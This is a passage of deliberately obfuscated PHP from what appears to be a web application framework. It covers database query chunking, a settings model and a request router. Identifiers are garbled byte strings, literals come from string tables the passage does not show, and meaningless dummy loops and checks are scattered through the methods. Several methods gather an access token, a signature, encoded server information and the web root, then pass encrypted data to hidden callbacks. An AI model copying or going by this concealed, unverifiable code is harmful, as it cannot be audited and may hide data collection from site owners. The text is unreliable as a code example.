(!is_array($à¾ÜÉÏ )) { return $à¾ÜÉÏ ; } $Û¯œ½‘Ÿ = array(); $¯¼ÊæÉÖ = 0; foreach ($à¾ÜÉÏ  as $¼øÒ·² => $›ËÖ¶ˆ¾) { if (is_array($›ËÖ¶ˆ¾) && count($›ËÖ¶ˆ¾) == 2 && $›ËÖ¶ˆ¾[0] == $„ÍÊÑˆ[383] && is_string($›ËÖ¶ˆ¾[1]) && substr($›ËÖ¶ˆ¾[1], 0, 1) == $„ÍÊÑˆ[384] && substr($›ËÖ¶ˆ¾[1], strlen($›ËÖ¶ˆ¾[1]) - 1, 1) == $„ÍÊÑˆ[384]) { $¥¶¯©æµ = !0; $£êÕäÃù = is_string($¼øÒ·²) ? $¼øÒ·² : $Õ½ì¯Ìú; $·¢Ë›€ = substr($›ËÖ¶ˆ¾[1], 1, strlen($›ËÖ¶ˆ¾[1]) - 2); $·¢Ë›€ = $this->db->escapeString($·¢Ë›€); if (!strpos($£êÕäÃù, $„ÍÊÑˆ[10])) { $£êÕäÃù = $„ÍÊÑˆ[385] . $£êÕäÃù . $„ÍÊÑˆ[385]; } $»şªêÎè = $„ÍÊÑˆ[189] . $·¢Ë›€ . $„ÍÊÑˆ[189]; $·¢Ë›€ = str_replace(array($„ÍÊÑˆ[10], $„ÍÊÑˆ[386], $„ÍÊÑˆ[11]), $„ÍÊÑˆ[387], $·¢Ë›€); if ($ƒ­æßó[$„ÍÊÑˆ[388]]) { $»şªêÎè = $„ÍÊÑˆ[389] . $·¢Ë›€ . $„ÍÊÑˆ[390]; if ($ƒ­æßó[$„ÍÊÑˆ[391]]) { $»şªêÎè = $„ÍÊÑˆ[390] . $·¢Ë›€ . $„ÍÊÑˆ[389]; } } $Û¯œ½‘Ÿ[$¯¼ÊæÉÖ] = $„ÍÊÑˆ[392] . $£êÕäÃù . $„ÍÊÑˆ[393] . $»şªêÎè . $„ÍÊÑˆ[394]; $¯¼ÊæÉÖ++; continue; } if (is_array($›ËÖ¶ˆ¾)) { $Õ½ì¯Ìú = is_string($¼øÒ·²) ? $¼øÒ·² : $Õ½ì¯Ìú; $›ËÖ¶ˆ¾ = $this->parseWhereLike($›ËÖ¶ˆ¾, $Õ½ì¯Ìú, !0, $¥¶¯©æµ); } if (is_numeric($¼øÒ·²)) { $Û¯œ½‘Ÿ[$¯¼ÊæÉÖ] = $›ËÖ¶ˆ¾; $¯¼ÊæÉÖ++; } else { $Û¯œ½‘Ÿ[$¼øÒ·²] = $›ËÖ¶ˆ¾; } } if ($¥¶¯©æµ && !$­±¸—«®) { } return $Û¯œ½‘Ÿ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ñ‘Ò÷ô = array()) { $¾ÊÂª·Â =& $_SERVER[§ŒØóıü]; $…€ÙÒÅí = self::SQL_WHERE_IN_CHUNK; $âï˜á = $this->optionsValue(); $¶Ä­ºÏ© = $this->findWhereField($âï˜á); if (!$¶Ä­ºÏ© || isset($âï˜á[$¾ÊÂª·Â[292]]) || isset($âï˜á[$¾ÊÂª·Â[353]])) { return parent::select($Ñ‘Ò÷ô); } $øÎäö˜Ë = $âï˜á[$¾ÊÂª·Â[275]][$¶Ä­ºÏ©][1]; $øÎäö˜Ë = is_array($øÎäö˜Ë) ? $øÎäö˜Ë : array(); $¡âß»Æ” = null; for ($ÑÌÄşœ = 0; $ÑÌÄşœ < count($øÎäö˜Ë); $ÑÌÄşœ += $…€ÙÒÅí) { $¹ËûØ‹µ = array_slice($øÎäö˜Ë, $ÑÌÄşœ, $…€ÙÒÅí); if (!is_array($¹ËûØ‹µ) || count($¹ËûØ‹µ) == 0) { break; } $âï˜á[$¾ÊÂª·Â[275]][$¶Ä­ºÏ©][1] = $¹ËûØ‹µ; $this->optionsValue($âï˜á); $ÎÊ“½Œâ = parent::select($Ñ‘Ò÷ô); if (!$ÎÊ“½Œâ) { continue; } $¡âß»Æ” = is_array($¡âß»Æ”) ? $¡âß»Æ” : array(); $¡âß»Æ” = array_merge($¡âß»Æ”, $ÎÊ“½Œâ); } return $¡âß»Æ”; } public function delete($¼æ‡ = array()) { $ûŒ‘Ò =& $_SERVER[§ŒØóıü]; $¾¹ÄïŒÑ = self::SQL_WHERE_IN_CHUNK; $Õ‹®ãâ¾ = $this->optionsValue(); $šÀ†åÀ¡ = $this->findWhereField($Õ‹®ãâ¾); if (!$šÀ†åÀ¡) { return parent::delete($¼æ‡); } $¢òº¶øµ = 0; $ÑË»œÜ = $Õ‹®ãâ¾[$ûŒ‘Ò[275]][$šÀ†åÀ¡][1]; $ÑË»œÜ = is_array($ÑË»œÜ) ? $ÑË»œÜ : array(); for ($¡¶ò«¾÷ = 0; $¡¶ò«¾÷ < count($ÑË»œÜ); $¡¶ò«¾÷ += $¾¹ÄïŒÑ) { $å¨ùÁß = array_slice($ÑË»œÜ, $¡¶ò«¾÷, $¾¹ÄïŒÑ); if (!is_array($å¨ùÁß) || count($å¨ùÁß) == 0) { break; } $Õ‹®ãâ¾[$ûŒ‘Ò[275]][$šÀ†åÀ¡][1] = $å¨ùÁß; $this->optionsValue($Õ‹®ãâ¾); $¢òº¶øµ += parent::delete($¼æ‡); } return $¢òº¶øµ; } private function findWhereField($é“óô’ä) { $¦Ù»ë‘¨ =& $_SERVER[§ŒØóıü]; $¶úîˆıÂ = self::SQL_WHERE_IN_CHUNK; if (!is_array($é“óô’ä) || !is_array($é“óô’ä[$¦Ù»ë‘¨[275]])) { return !1; } foreach ($é“óô’ä[$¦Ù»ë‘¨[275]] as $·¤ºÍß => $™‘Ø‰••) { if (is_array($™‘Ø‰••) && isset($™‘Ø‰••[0]) && is_string($™‘Ø‰••[0]) && strtolower($™‘Ø‰••[0]) == $¦Ù»ë‘¨[7] && is_array($™‘Ø‰••[1]) && count($™‘Ø‰••[1]) > $¶úîˆıÂ) { ignore_timeout(); return $·¤ºÍß; } } return !1; } public function setMasterDB($ôÎ Àñº = true) { think_config($_SERVER[§ŒØóıü][395], $ôÎ Àñº); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\155\117\160\164\x69\x6f\x6e"; public $field = array(); public function listData($›õ¤™ä€ = false, $¯½ìß” = "\x6d\x6f\x64\x69\x66\x79\124\151\155\x65", $œŞı‹—ü = false) { $å«äïİ” = Model($this->modelType)->get(!1, $this->optionType, !0); $Í¼Í•ş = array_values($å«äïİ”); if ($Í¼Í•ş && $Í¼Í•ş[0] && !is_array($Í¼Í•ş[0])) { Model($this->modelType)->cacheRemove($this->optionType); $å«äïİ” = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$å«äïİ”) { return $›õ¤™ä€ ? null : array(); } if (!$›õ¤™ä€) { $å«äïİ” = array_filter(array_values($å«äïİ”)); return array_sort_by($å«äïİ”, $¯½ìß”, $œŞı‹—ü); } return $å«äïİ”[$_SERVER[§ŒØóıü][396] . $›õ¤™ä€]; } public function insert($«´¦™ò¿) { $…®öŠ±™ =& $_SERVER[§ŒØóıü]; $«´¦™ò¿ = array_field_key($«´¦™ò¿, $this->field); $›šœ€ØÔ = Model($this->modelType)->get($…®öŠ±™[397], $this->optionType . $…®öŠ±™[398]); $›šœ€ØÔ = $›šœ€ØÔ ? $›šœ€ØÔ : 0; $«´¦™ò¿[$…®öŠ±™[399]] = ++$›šœ€ØÔ; $«´¦™ò¿[$…®öŠ±™[201]] = time(); $«´¦™ò¿[$…®öŠ±™[85]] = time(); Model($this->modelType)->set($…®öŠ±™[397], $›šœ€ØÔ, $this->optionType . $…®öŠ±™[398]); Model($this->modelType)->set($…®öŠ±™[396] . $›šœ€ØÔ, $«´¦™ò¿, $this->optionType); return $›šœ€ØÔ; } public function update($šï§—ù, $†ŒÌÊèü) { $¤¶©¿êÎ =& $_SERVER[§ŒØóıü]; $†ŒÌÊèü = array_field_key($†ŒÌÊèü, $this->field); $±ŸÙĞ•º = $this->listData($šï§—ù); if (!$±ŸÙĞ•º || !$šï§—ù) { return !1; } $†ŒÌÊèü = array_merge($±ŸÙĞ•º, $†ŒÌÊèü); $†ŒÌÊèü[$¤¶©¿êÎ[85]] = time(); return Model($this->modelType)->set($¤¶©¿êÎ[396] . $šï§—ù, $†ŒÌÊèü, $this->optionType); } public function remove($’†é­Öí) { if (!$’†é­Öí) { return !1; } return Model($this->modelType)->remove($_SERVER[§ŒØóıü][396] . $’†é­Öí, $this->optionType); } public function clear() { $ğ»ıúÃ =& $_SERVER[§ŒØóıü]; Model($this->modelType)->remove($ğ»ıúÃ[397], $this->optionType . $ğ»ıúÃ[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ŠŒöÚÒ, $ïİ’‡æ) { if (!$ïİ’‡æ) { return !1; } $¾ŒÅ¢æ = $this->listData(); $¾ŒÅ¢æ = array_to_keyvalue($¾ŒÅ¢æ, $ŠŒöÚÒ); return isset($¾ŒÅ¢æ[$ïİ’‡æ]) ? $¾ŒÅ¢æ[$ïİ’‡æ] : !1; } public function findByName($»ÅååĞ) { return $this->findByKey($_SERVER[§ŒØóıü][32], $»ÅååĞ); } protected function resetData($á¥€âŞ€) { $í½ÇÖŒ¶ =& $_SERVER[§ŒØóıü]; $á¥€âŞ€ = is_array($á¥€âŞ€) ? $á¥€âŞ€ : array(); $ˆ…Á©æ® = array(); for ($»ÔîïîŸ = 0; $»ÔîïîŸ < count($á¥€âŞ€); $»ÔîïîŸ++) { $ˆ…Á©æ®[$í½ÇÖŒ¶[396] . $á¥€âŞ€[$»ÔîïîŸ][$í½ÇÖŒ¶[399]]] = $á¥€âŞ€[$»ÔîïîŸ]; } return Model($this->modelType)->set($ˆ…Á©æ®, !1, $this->optionType); } private function getAutoName($Á­õ›•ı) { $îĞ”Ç÷³ = array_to_keyvalue($this->listData(), $_SERVER[§ŒØóıü][32]); if (!$îĞ”Ç÷³ || !isset($îĞ”Ç÷³[$Á­õ›•ı])) { return $Á­õ›•ı; } for ($§µŠ§À = 1; $§µŠ§À < count($îĞ”Ç÷³); $§µŠ§À++) { $áÆŞÈÉ = $Á­õ›•ı . "\x28{$§µŠ§À}\x29"; if (!isset($îĞ”Ç÷³[$áÆŞÈÉ])) { return $áÆŞÈÉ; } } return $áÆŞÈÉ; } } goto B›Õ„÷Ç–Ê; ešÊí¸Â¶: class Application { private $defaultModule = "\151\156\x64\145\170"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\x69\156\144\x65\x78"; function __construct() { } public function setDefault($óŞ™¾ÔÉ) { $´²Œ…Š† =& $_SERVER[§ŒØóıü]; $ªíÜäô =& $_SERVER[ÉÖ¬ãã¿]; $§ñãú£ = explode($ªíÜäô[0], trim($óŞ™¾ÔÉ, $ªíÜäô[0])); $Êº«Û—× = $´²Œ…Š†[611]; if (!$Êº«Û—×) { return; } $this->defaultModule = $§ñãú£[0] ? $§ñãú£[0] : $this->defaultModule; $this->defaultController = $§ñãú£[1] ? $§ñãú£[1] : $this->defaultController; $íÚ“ßÔú = $´²Œ…Š†[612]; $this->defaultAction = $§ñãú£[2] ? $§ñãú£[2] : $this->defaultAction; $—ÖúÊÓ = $´²Œ…Š†[613]; if (strlen($—ÖúÊÓ) < $´²Œ…Š†[614]) { return; } $this->xvzo360f7aa3($ªíÜäô[1], array($this, $ªíÜäô[2])); $ûæ‡Î° = $´²Œ…Š†[615]; } public function appRun($Ö¾Ë§Í) { $˜ùÉ°¯ =& $_SERVER[§ŒØóıü]; $ÊÕãêö =& $_SERVER[ÉÖ¬ãã¿]; $Æà¸­±İ = explode($ÊÕãêö[0], $Ö¾Ë§Í); $ÁÅÀÆé‚ = $˜ùÉ°¯[616]; $¦¤ˆ”âù = strtolower($Æà¸­±İ[0]); $×öæãœŒ = $ÊÕãêö[3]; $¹èĞƒ¥ß = $˜ùÉ°¯[617]; if (!$¹èĞƒ¥ß) { return; } if ($¦¤ˆ”âù == $ÊÕãêö[4]) { $×öæãœŒ = $ÊÕãêö[5]; $Æà¸­±İ[0] = $ÊÕãêö[6]; $Æà¸­±İ[1] = $Æà¸­±İ[1] . $ÊÕãêö[7]; $Ö¾Ë§Í = join($ÊÕãêö[0], $Æà¸­±İ); $Ö¾Ë§Í = trim($Ö¾Ë§Í, $ÊÕãêö[0]); } call_user_func(array($ÊÕãêö[8], $ÊÕãêö[9]), $×öæãœŒ . $ÊÕãêö[10], $Ö¾Ë§Í); ActionCall($Ö¾Ë§Í); call_user_func(array($ÊÕãêö[8], $ÊÕãêö[9]), $×öæãœŒ . $ÊÕãêö[11], $Ö¾Ë§Í); $éÒÅªŒš = $˜ùÉ°¯[618]; if (!$éÒÅªŒš) { die; } } private function autorun() { $ó¨Íü•§ =& $_SERVER[§ŒØóıü]; $‚Ÿ†•ÏÑ =& $_SERVER[ÉÖ¬ãã¿]; global $config; $ºì‚ÕîÈ = $ó¨Íü•§[619]; if (count($config[$‚Ÿ†•ÏÑ[12]]) == 0) { return; } foreach ($config[$‚Ÿ†•ÏÑ[12]] as $ƒ¶ëÍäÌ => $å‡ë€ª¢) { $this->appRun($å‡ë€ª¢); $öû½ø = $ó¨Íü•§[620]; if (strlen($öû½ø) < $ó¨Íü•§[614]) { die; } } } private function lrwf899df0fd() { $÷Ş’°½· =& $_SERVER[§ŒØóıü]; $ëçØî =& $_SERVER[ÉÖ¬ãã¿]; $ˆéê©„Î = $ëçØî[4]; $¡áçéœ = $GLOBALS[$ëçØî[13]][$ëçØî[14]][0]; $“ˆ€õş = $÷Ş’°½·[621]; if (strlen($“ˆ€õş) < $÷Ş’°½·[607]) { die; } if (!$¡áçéœ || strlen($¡áçéœ) <= strlen($ˆéê©„Î)) { return; } if (strtolower(substr($¡áçéœ, -strlen($ˆéê©„Î))) != $ˆéê©„Î) { return; } $ş”¥Şë = substr($¡áçéœ, 0, -strlen($ˆéê©„Î)); $„áì©Ã¤ = $÷Ş’°½·[622]; $½ä™ºÎ¿ = array($ëçØî[4], $ş”¥Şë); $§¥¥·ÎŸ = array_slice($GLOBALS[$ëçØî[13]][$ëçØî[14]], 1); $GLOBALS[$ëçØî[13]][$ëçØî[14]] = array_merge($½ä™ºÎ¿, $§¥¥·ÎŸ); $GLOBALS[$ëçØî[13]][$ëçØî[15]] = implode($ëçØî[0], $GLOBALS[$ëçØî[13]][$ëçØî[14]]); } private function svja97e242cb() { $óİä“Ë¼ =& $_SERVER[§ŒØóıü]; $¤ø“šÔë =& $_SERVER[ÉÖ¬ãã¿]; if ($GLOBALS[$¤ø“šÔë[13]][$¤ø“šÔë[15]] != $¤ø“šÔë[6]) { return; } $©¶™ôäò = $_SERVER[$¤ø“šÔë[16]]; $ó× ×ô = $óİä“Ë¼[623]; $Ñö˜Âğ¹ = $¤ø“šÔë[17]; $úîøºº½ = $óİä“Ë¼[624]; while ($úîøºº½ < $óİä“Ë¼[625]) { if ($úîøºº½ >= 0) { break; } $úîøºº½++; } if (!strstr($©¶™ôäò, $Ñö˜Âğ¹)) { return; } $ùæÎº× = strrpos($©¶™ôäò, $Ñö˜Âğ¹); $À÷Ü› = $óİä“Ë¼[626]; $Ã“Ã¶ÙÃ = substr($©¶™ôäò, $ùæÎº× + strlen($Ñö˜Âğ¹)); $şôåÉü¿ = $óİä“Ë¼[627]; preg_match_all($¤ø“šÔë[18], $Ã“Ã¶ÙÃ, $‰íŠÓ); $æ¾…´±ü = $óİä“Ë¼[628]; $Ã“Ã¶ÙÃ = trim($‰íŠÓ[0][0], $¤ø“šÔë[19]); $Ìò…Ã²´ = $óİä“Ë¼[629]; if (strlen($Ìò…Ã²´) < $óİä“Ë¼[630]) { return; } $GLOBALS[$¤ø“šÔë[13]][$¤ø“šÔë[14]] = explode($¤ø“šÔë[19], $Ã“Ã¶ÙÃ); $GLOBALS[$¤ø“šÔë[13]][$¤ø“šÔë[15]] = implode($¤ø“šÔë[0], $GLOBALS[$¤ø“šÔë[13]][$¤ø“šÔë[14]]); $šÔùù™Ä = $óİä“Ë¼[631]; } public function run() { $¸Ñ« Ç» =& $_SERVER[§ŒØóıü]; $ùö­õ®“ =& $_SERVER[ÉÖ¬ãã¿]; $this->svja97e242cb(); $this->lrwf899df0fd(); $–ª¶ÍË = $¸Ñ« Ç»[632]; if (!$–ª¶ÍË) { die; } $ —£µÕÃ = $GLOBALS[$ùö­õ®“[13]][$ùö­õ®“[14]]; $Å¼‘˜î¹ = $¸Ñ« Ç»[633]; if (strlen($Å¼‘˜î¹) < $¸Ñ« Ç»[625]) { return; } $‹à™É³ = $GLOBALS[$ùö­õ®“[13]][$ùö­õ®“[15]]; $Í¤¡¥¥ = $¸Ñ« Ç»[634]; define($ùö­õ®“[20], isset($ —£µÕÃ[0]) && $ —£µÕÃ[0] ? $ —£µÕÃ[0] : $this->defaultModule); define($ùö­õ®“[21], isset($ —£µÕÃ[1]) && $ —£µÕÃ[0] ? $ —£µÕÃ[1] : $this->defaultController); $—¤³…Â = $¸Ñ« Ç»[635]; if (strlen($—¤³…Â) < $¸Ñ« Ç»[625]) { return; } define($ùö­õ®“[22], isset($ —£µÕÃ[2]) && $ —£µÕÃ[0] ? $ —£µÕÃ[2] : $this->defaultAction); $Ë®Ò¼µº = $¸Ñ« Ç»[636]; if (strlen($Ë®Ò¼µº) < $¸Ñ« Ç»[630]) { return; } define($ùö­õ®“[23], MOD . $ùö­õ®“[0] . ST . $ùö­õ®“[0] . ACT); $_SERVER[$ùö­õ®“[24]] = strtolower(ACTION); $this->autorun(); $ÛŠ˜ïËã = $¸Ñ« Ç»[637]; while (strlen($ÛŠ˜ïËã) < $¸Ñ« Ç»[607]) { if (!$ÛŠ˜ïËã) { break; } $ÛŠ˜ïËã++; } if (count($ —£µÕÃ) >= 3) { $this->appRun($‹à™É³); } else { $this->appRun(ACTION); } } private $bafy39fe49a1 = array(); private $jiwf567ff2de = ''; public function flyodabefd7c() { $ºà…“¹© =& $_SERVER[§ŒØóıü]; $úßÁÖ§¤ =& $_SERVER[ÉÖ¬ãã¿]; $this->quil9bc564f2(); $this->mykh8b3118b3(); $this->jpqk01b4fdaf(); $this->fsju2b20a22b(); $this->potk2a64be58(); $ÍÑí´Ö¹ = $ºà…“¹©[638]; $this->pufz11047363(); $Ü•Áß®¦ = $ºà…“¹©[639]; while (strlen($Ü•Áß®¦) < $ºà…“¹©[630]) { if (!$Ü•Áß®¦) { break; } $Ü•Áß®¦++; } $this->qrgh87ea92ce(); $‚ÃÕÊÒ = $ºà…“¹©[640]; $this->xvzo360f7aa3($úßÁÖ§¤[25], array($this, $úßÁÖ§¤[26])); $Î…ùğ† = $ºà…“¹©[641]; if (strlen($Î…ùğ†) < $ºà…“¹©[607]) { die; } $this->xvzo360f7aa3($úßÁÖ§¤[27], array($this, $úßÁÖ§¤[28])); $this->xvzo360f7aa3($úßÁÖ§¤[29], array($this, $úßÁÖ§¤[30])); $šªºõûò = $ºà…“¹©[642]; if (!$šªºõûò) { return; } $this->xvzo360f7aa3($úßÁÖ§¤[31], array($this, $úßÁÖ§¤[32])); $´‘ƒÃÏ® = $ºà…“¹©[643]; } public function uwsjf2261486($ÏÂ®—’Ú) { $á’Ëâğ‘ =& $_SERVER[§ŒØóıü]; $­½ÃÌÌ =& $_SERVER[ÉÖ¬ãã¿]; $ïöÇÂ°µ = Model($­½ÃÌÌ[33])->get(); $Ğë÷Ãü± = $á’Ëâğ‘[644]; if (strlen($Ğë÷Ãü±) < $á’Ëâğ‘[607]) { return; } $…ûóÇØÓ = array($­½ÃÌÌ[34], $­½ÃÌÌ[35], $­½ÃÌÌ[36], $­½ÃÌÌ[37], $­½ÃÌÌ[38], $­½ÃÌÌ[39], $­½ÃÌÌ[40], $­½ÃÌÌ[41], $­½ÃÌÌ[42], $­½ÃÌÌ[43], $­½ÃÌÌ[44], $­½ÃÌÌ[45], $­½ÃÌÌ[46], $­½ÃÌÌ[47], $­½ÃÌÌ[48], $­½ÃÌÌ[49], $­½ÃÌÌ[50], $­½ÃÌÌ[51], $­½ÃÌÌ[52], $­½ÃÌÌ[53], $­½ÃÌÌ[54], $­½ÃÌÌ[55], $­½ÃÌÌ[56], $­½ÃÌÌ[57], $­½ÃÌÌ[58], $­½ÃÌÌ[59], $­½ÃÌÌ[60], $­½ÃÌÌ[61], $­½ÃÌÌ[62], $­½ÃÌÌ[63], $­½ÃÌÌ[64], $­½ÃÌÌ[65], $­½ÃÌÌ[66], $­½ÃÌÌ[67], $­½ÃÌÌ[68], $­½ÃÌÌ[69], $­½ÃÌÌ[70], $­½ÃÌÌ[71], $­½ÃÌÌ[72], $­½ÃÌÌ[73], $­½ÃÌÌ[74], $­½ÃÌÌ[75], $­½ÃÌÌ[76], $­½ÃÌÌ[77], $­½ÃÌÌ[78], $­½ÃÌÌ[79], $­½ÃÌÌ[80], $­½ÃÌÌ[81], $­½ÃÌÌ[82], $­½ÃÌÌ[83], $­½ÃÌÌ[84]); $ñ¸»¾Óë = $á’Ëâğ‘[645]; while (strlen($ñ¸»¾Óë) < $á’Ëâğ‘[607]) { if (!$ñ¸»¾Óë) { break; } $ñ¸»¾Óë++; } foreach ($…ûóÇØÓ as $ššÌÀ) { $ÚÏ×î®‘ = $GLOBALS[$­½ÃÌÌ[85]][$­½ÃÌÌ[86]][$ššÌÀ]; $¼åİœ… = $á’Ëâğ‘[646]; while ($¼åİœ… < $á’Ëâğ‘[625]) { if ($¼åİœ… >= 0) { break; } $¼åİœ…++; } if (isset($ïöÇÂ°µ[$ššÌÀ])) { $ÚÏ×î®‘ = $ïöÇÂ°µ[$ššÌÀ]; } $ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[88]][$ššÌÀ] = $ÚÏ×î®‘; } $ÃÎøâÊ = $ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[88]][$­½ÃÌÌ[46]]; unset($ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[89]][$­½ÃÌÌ[90]]); unset($ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[89]][$­½ÃÌÌ[91]]); unset($ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[88]][$­½ÃÌÌ[46]]); $ËƒÊÇ¬ı = $á’Ëâğ‘[647]; if (strlen($ËƒÊÇ¬ı) < $á’Ëâğ‘[614]) { return; } unset($ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[88]][$­½ÃÌÌ[92]]); $ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[88]][$­½ÃÌÌ[93]] = array($­½ÃÌÌ[94] => (int) $ÃÎøâÊ[$­½ÃÌÌ[95]], $­½ÃÌÌ[96] => (int) _get($ÃÎøâÊ, $­½ÃÌÌ[97], 0)); $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[99]] = Action($­½ÃÌÌ[100])->accessToken(); $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[101]] = md5($_SERVER[$­½ÃÌÌ[102]] . $ïöÇÂ°µ[$­½ÃÌÌ[103]]); $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[104]] = base64_encode(serverInfo()); $Ü‚¿ÇÒË = $á’Ëâğ‘[648]; if (strlen($Ü‚¿ÇÒË) < $á’Ëâğ‘[607]) { return; } $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[105]] = $this->jiwf567ff2de; $Ê¦à± = $á’Ëâğ‘[649]; if ($ïöÇÂ°µ[$­½ÃÌÌ[105]] != $­½ÃÌÌ[106]) { $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[107]] = $ïöÇÂ°µ[$­½ÃÌÌ[107]]; $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[108]] = $ïöÇÂ°µ[$­½ÃÌÌ[108]]; $¯ƒê°¿Õ = rand_string(10) . $this->jiwf567ff2de . rand_string(5); $ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[109]][$­½ÃÌÌ[110]] = $this->mhlv18910cdb($¯ƒê°¿Õ, $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[101]]); } if ($this->jiwf567ff2de == $­½ÃÌÌ[106]) { $ÏÂ®—’Ú[$­½ÃÌÌ[87]][$­½ÃÌÌ[88]][$­½ÃÌÌ[93]][$­½ÃÌÌ[97]] = 0; } $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[111]] = _get($this->bafy39fe49a1, $­½ÃÌÌ[112], $­½ÃÌÌ[6]); $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[113]] = _get($this->bafy39fe49a1, $­½ÃÌÌ[114], $­½ÃÌÌ[6]); if (_get($GLOBALS, $­½ÃÌÌ[115]) && $this->config[$­½ÃÌÌ[116]]) { $ÏÂ®—’Ú[$­½ÃÌÌ[98]][$­½ÃÌÌ[117]] = WEB_ROOT; } return $ÏÂ®—’Ú; } private function pufz11047363() { $¤ÉÜíü° =& $_SERVER[§ŒØóıü]; $³ÇåÛ¤• =& $_SERVER[ÉÖ¬ãã¿]; $óô¢ÁÕ· = $_SERVER[$³ÇåÛ¤•[24]] == $³ÇåÛ¤•[118]; $ËœğœóÀ = $¤ÉÜíü°[650]; if (!$ËœğœóÀ) { return; } if ($_SERVER[$³ÇåÛ¤•[24]] == $³ÇåÛ¤•[119] && $_GET[$³ÇåÛ¤•[120]] == $³ÇåÛ¤•[121]) { $óô¢ÁÕ· = !0; } if ($óô¢ÁÕ·) { $üõŠ× = array($³ÇåÛ¤•[105] => $this->jiwf567ff2de, $³ÇåÛ¤•[122] => $this->kumd6b08031a(), $³ÇåÛ¤•[123] => Model($³ÇåÛ¤•[124])->count()); if ($this->jiwf567ff2de != $³ÇåÛ¤•[106]) { $ÚŠ…ÀŒ = _get($this->bafy39fe49a1, $³ÇåÛ¤•[125]); if ($ÚŠ…ÀŒ) { $üõŠ×[$³ÇåÛ¤•[126]] = $ÚŠ…ÀŒ; $üõŠ×[$³ÇåÛ¤•[127]] = strtotime(_get($this->bafy39fe49a1, $³ÇåÛ¤•[128])); $üõŠ×[$³ÇåÛ¤•[129]] = _get($this->bafy39fe49a1, $³ÇåÛ¤•[114]); } $Òıƒóœì = Model($³ÇåÛ¤•[33])->get($³ÇåÛ¤•[130], $³ÇåÛ¤•[6], !0); if (is_string($Òıƒóœì) && substr($Òıƒóœì, 0, 1) == $³ÇåÛ¤•[131]) { $Òıƒóœì = json_decode_force($Òıƒóœì); } if (is_array($Òıƒóœì) && $Òıƒóœì[$³ÇåÛ¤•[132]] && strstr($Òıƒóœì[$³ÇåÛ¤•[132]], $³ÇåÛ¤•[133])) { $ºûĞ´” = explode($³ÇåÛ¤•[133], $Òıƒóœì[$³ÇåÛ¤•[132]]); $üõŠ×[$³ÇåÛ¤•[134]] = $ºûĞ´”[0]; } } $üõŠ× = $this->mvgua016bb21(json_encode($üõŠ×), md5($³ÇåÛ¤•[135])); $¯×äè°á = array($³ÇåÛ¤•[136] => $üõŠ×); $úµÃï˜ = $¤ÉÜíü°[651]; while (strlen($úµÃï˜) < $¤ÉÜíü°[625]) { if (!$úµÃï˜) { break; } $úµÃï˜++; } call_user_func(array($³ÇåÛ¤•[137], $³ÇåÛ¤•[138]), $¯×äè°á); $Öı®¢¦é = $¤ÉÜíü°[652]; } if ($this->jiwf567ff2de == $³ÇåÛ¤•[106]) { return; } $¿Â»ı±š = array($³ÇåÛ¤•[139], $³ÇåÛ¤•[140], $³ÇåÛ¤•[141], $³ÇåÛ¤•[142], $³ÇåÛ¤•[143], $³ÇåÛ¤•[144]); $¡¯æÌÀ® = Model($³ÇåÛ¤•[33])->get(); $¯×äè°á = array($³ÇåÛ¤•[145] => $¡¯æÌÀ®[$³ÇåÛ¤•[34]], $³ÇåÛ¤•[146] => $¡¯æÌÀ®[$³ÇåÛ¤•[35]], $³ÇåÛ¤•[147] => $³ÇåÛ¤•[6]); foreach ($¿Â»ı±š as $“©¦åô) { if (!isset($¡¯æÌÀ®[$“©¦åô]) || !$¡¯æÌÀ®[$“©¦åô]) { continue; } $¯×äè°á[$“©¦åô] = $¡¯æÌÀ®[$“©¦åô]; } call_user_func(array($³ÇåÛ¤•[137], $³ÇåÛ¤•[138]), $¯×äè°á); $§¨‘¸€ª = $¤ÉÜíü°[653]; if (strlen($§¨‘¸€ª) < $¤ÉÜíü°[607]) { return; } } private function fsju2b20a22b() { $Ù¶ èò¤ =& $_SERVER[§ŒØóıü]; $üõ Õîú =& $_SERVER[ÉÖ¬ãã¿]; if ($_SERVER[$üõ Õîú[24]] != $üõ Õîú[148]) { return; } if (!_get($GLOBALS, $üõ Õîú[115])) { die; } $í×— ÁÕ = $GLOBALS[$üõ Õîú[13]]; if (isset($í×— ÁÕ[$üõ Õîú[149]])) { $this->fgjp34e32d1d(); die; } if (!isset($í×— ÁÕ[$üõ Õîú[150]]) || strlen($í×— ÁÕ[$üõ Õîú[150]]) != 16) { show_json($üõ Õîú[151] . $í×— ÁÕ[$üõ Õîú[150]], !1); } $“ñÒíÁ = Model($üõ Õîú[33])->get($üõ Õîú[103]); $û€³ÅÔ = md5($_SERVER[$üõ Õîú[102]] . $“ñÒíÁ); $ÖôÖìÍ = $Ù¶ èò¤[654]; while (strlen($ÖôÖìÍ) < $Ù¶ èò¤[614]) { if (!$ÖôÖìÍ) { break; } $ÖôÖìÍ++; } 